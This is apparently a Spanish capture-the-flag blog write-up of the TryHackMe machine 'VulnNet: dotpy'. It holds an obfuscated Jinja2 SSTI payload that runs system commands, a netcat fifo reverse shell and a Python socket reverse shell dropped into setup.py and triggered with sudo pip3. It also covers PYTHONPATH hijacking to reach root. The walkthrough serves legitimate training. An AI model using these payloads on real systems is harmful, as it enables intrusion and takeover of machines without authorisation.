---
title : "VulnNet: dotpy - Write Up - Español"
date : 2021-07-12T12:39:34+02:00
author : "Lanfran02"
cover : "cover.png"
useRelativeCover : true
description : "Máquina de nivel medio en TryHackMe."
tags : ["SSTI","Python","{{7*7}}","Burpsuite","sudo","TryHackMe"]
---

| Link | Nivel | Creador |
|------|-------|---------|
| [Aquí](https://tryhackme.com/room/vulnnetdotpy)  | Medio |  [TheCyb3rW0lf](https://tryhackme.com/p/TheCyb3rW0lf)  |


## Reconocimiento

Primero escaneamos la máquina con `nmap` para verificar qué puertos están abiertos/cerrados/filtrados.

```bash
╰─ lanfran@parrot ❯ map 10.10.43.197                                                                                               ─╯
[sudo] password for lanfran: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-12 12:49 CEST
Nmap scan report for 10.10.43.197
Host is up (0.067s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-title: VulnNet Entertainment -  Login  | Discover
|_Requested resource was http://10.10.43.197:8080/login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.12 seconds
```

¡Bien! Tenemos un servidor web `Python` que se ejecuta en el puerto 8080.

Vamos a navegar hacia el.

La página nos solicita iniciar sesión/registrarnos. Pero intenté navegar a una página que no existía.

![not_registered](not_registered.png)

Mmmm una página 403, que nos obliga a iniciar sesión...

Así que hagámoslo, creemos un usuario ficticio e inicie sesión, para que podamos navegar a esa página de nuevo...

Una vez que haya iniciado sesión, navegue de nuevo a la página que no existe y veamos algo muy interesante.

![logged_in](logged_in.png)

La página nos muestra la página solicitada, tal vez podamos explotar esto...

Así que utilicé el exploit común `{{7 * 7}}` para comprobar si era vulnerable, ¡¡y devolvió 49 !!

![exploit](exploit.png)


## Acceso inicial - Usuario

So we can exploit this with the following code.

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('###CODE###')|attr('read')()}}
```
Where says `###CODE###` you can just put your system command, so let's use `burpsuite` to send the request with `id` and see which user are we

![id](id.png)

Good! We are the `web` user, let's encode our shell to hex so we can run it, here you have the shell and the perfect encoding in a [Cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=To_Hex('%5C%5Cx',0)&input=cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2BJjF8bmMgSVAgMTMzNyA%2BL3RtcC9m) !

Send it with burpsuite, and get your reverse shell with `netcat`

![user](user.png)

Perfect! We now have a reverse shell, so let's first run `sudo -l` to see if our user can run a command with any other user
```bash
web@vulnnet-dotpy:~$ sudo -l
Matching Defaults entries for web on vulnnet-dotpy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User web may run the following commands on vulnnet-dotpy:
    (system-adm) NOPASSWD: /usr/bin/pip3 install *
web@vulnnet-dotpy:~$
```
Interesante, podemos ejecutar `pip3 install` con el usuario `system-adm`...

Al leer la página [GTFOBins](https://gtfobins.github.io/gtfobins/pip/#shell), creé otra shell reversa:

```bash
########VICTIMA
web@vulnnet-dotpy:/tmp/project$ cat setup.py 
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.160",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
web@vulnnet-dotpy:/tmp/project$ sudo -u system-adm /usr/bin/pip3 install .
Processing /tmp/project

########ATACANTE

╰─ lanfran@parrot ❯ nc -nlvp 1338                                                                                                  ─╯
listening on [any] 1338 ...
connect to [10.9.2.160] from (UNKNOWN) [10.10.43.197] 45420
$ id
uid=1000(system-adm) gid=1000(system-adm) groups=1000(system-adm),24(cdrom)
w$whoami
system-adm
$ cat /home/system-adm/user.txt
THM{[REDACTADO]}
$
```

¡Y ahora podemos leer la bandera del usuario!

## Root

Una vez más con este nuevo usuario, ejecuté `sudo -l` y obtenemos este resultado:

```bash
system-adm@vulnnet-dotpy:~$ sudo -l
Matching Defaults entries for system-adm on vulnnet-dotpy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User system-adm may run the following commands on vulnnet-dotpy:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```
Podemos aprovechar una vulnerabilidad de Pythonpath, en estos sencillos pasos:

1. Cree una "biblioteca de python" maliciosa llamada "zipfile.py" (que está siendo utilizada por el script `backup.py`) en`/tmp`
2. Ejecute este comando `sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/backup.py`

1) 	
```bash
system-adm@vulnnet-dotpy:~$ echo 'import pty; pty.spawn("/bin/bash")' > /tmp/zipfile.py
system-adm@vulnnet-dotpy:~$ cat /tmp/zipfile.py 
import pty; pty.spawn("/bin/bash")
```
2)
```bash
system-adm@vulnnet-dotpy:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/backup.py
root@vulnnet-dotpy:/home/system-adm# id
uid=0(root) gid=0(root) groups=0(root)
root@vulnnet-dotpy:/home/system-adm# whoami
root
root@vulnnet-dotpy:/home/system-adm# cat /root/root.txt 
THM{[REDACTADO]}
root@vulnnet-dotpy:/home/system-adm# 
```

¡Y hemos rooteado la máquina!

Eso es todo de mi parte, ¡espero que lo encuentre útil!